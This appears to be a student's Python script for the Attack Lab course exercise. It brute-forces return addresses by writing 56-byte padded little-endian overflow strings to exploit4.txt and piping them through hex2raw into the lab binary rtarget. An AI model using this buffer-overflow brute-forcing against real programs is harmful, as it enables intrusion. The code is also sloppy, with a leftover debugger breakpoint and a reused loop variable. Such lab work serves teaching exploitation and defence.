import subprocess as sp
import pdb

for i in range(4201265,4201323):
    pdb.set_trace()
    d = hex(i)[2:]
    output = " "
    for i in range(len(d),0,-2):
        output = output + d[i-2:i] + " "

    out_buffer = "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" + output + "00 00 00 00"

    text_file = open("exploit4.txt", "w")
    text_file.write("%s" % out_buffer)

 #   sp.call(["./hex2raw", "<", "exploit4.txt", "|", "./rtarget"], shell=True)
    with open("exploit4.txt") as inhandle:
        p = sp.Popen("./hex2raw",stdin=inhandle,stdout=sp.PIPE)
        p2 = sp.Popen("./rtarget",stdin=p.stdout,stdout=sp.PIPE)
        [output,error] = p2.communicate()
